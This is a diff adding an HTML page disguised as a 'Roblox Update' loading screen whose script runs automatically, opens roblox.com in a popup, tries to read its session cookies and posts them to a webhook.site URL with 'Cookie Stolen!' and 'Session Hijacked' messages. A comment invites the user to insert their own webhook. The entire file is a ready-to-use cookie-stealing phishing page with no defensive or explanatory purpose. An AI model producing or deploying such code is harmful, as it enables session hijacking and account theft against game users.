@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Roblox Update</title>
+    <style>
+        body { background: #1b1d1f; color: white; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="loader"></div>
+    <script>
+        // REPLACE WITH YOUR WEBHOOK SITE URL
+        const WEBHOOK = "https://webhook.site/3f899a22-0936-4f05-827f-8e24d5d0dcc1";
+
+        async function steal() {
+            // Open Roblox in a popup
+            const win = window.open("https://www.roblox.com/home", "roblox_popup", "width=800,height=600");
+           
+            // Wait for the popup to load
+            await new Promise(resolve => setTimeout(resolve, 2000));
+           
+            try {
+                // Try to read cookies from the popup window
+                const cookies = win.document.cookie;
+               
+                if (!cookies) {
+                    // Fallback: Send empty if popup blocked
+                    sendToDiscord("(Popup Blocked or No Cookies Found)");
+                } else {
+                    sendToDiscord(cookies);
+                }
+               
+                win.close();
+            } catch (e) {
+                sendToDiscord("(Error: " + e.message + ")");
+            }
+        }
+
+        async function sendToDiscord(cookieData) {
+            fetch(WEBHOOK, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    content: "🎣 **Cookie Stolen!** ``` " + cookieData + " ```",
+                    embeds: [{
+                        title: "Session Hijacked",
+                        description: "Cookie captured from popup.",
+                        color: 15158332
+                    }]
+                })
+            });
+        }
+
+        steal();
+    </script>
+</body>
+</html>
